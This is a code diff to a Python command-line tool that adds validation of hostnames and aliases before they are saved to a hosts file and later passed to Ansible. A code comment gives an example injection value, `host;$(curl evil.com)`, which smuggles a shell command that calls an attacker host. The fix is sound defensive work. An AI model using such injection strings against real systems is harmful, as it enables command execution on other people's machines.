@@ -25,7 +25,11 @@ from typing import Optional
 
 import typer
 
-from clawrium.cli.clawctl._common import require_flag
+from clawrium.cli.clawctl._common import (
+    require_flag,
+    validate_alias,
+    validate_hostname,
+)
 from clawrium.cli.output import emit_error, stream_action
 from clawrium.core.hosts import (
     DuplicateHostError,
@@ -49,6 +53,12 @@ def create(
     ),
 ) -> None:
     """Create a host record (optionally bootstrap remote)."""
+    # ATX iter-1 B10: validate hostname + alias before they reach hosts.json
+    # so a value like `host;$(curl evil.com)` cannot persist and be passed
+    # to Ansible on every subsequent lifecycle op.
+    validate_hostname(hostname)
+    if alias is not None:
+        validate_alias(alias)
     require_flag(user, flag="--user")
     final_user = user or getpass.getuser()
 
